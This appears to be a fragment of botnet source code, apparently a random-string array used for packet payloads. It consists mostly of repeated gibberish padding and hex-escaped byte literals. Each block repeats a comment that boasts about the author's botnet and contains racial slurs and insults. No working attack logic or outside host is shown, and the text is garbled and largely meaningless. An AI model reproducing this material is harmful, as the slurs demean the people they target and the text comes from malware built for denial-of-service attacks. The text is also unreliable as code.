UOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFI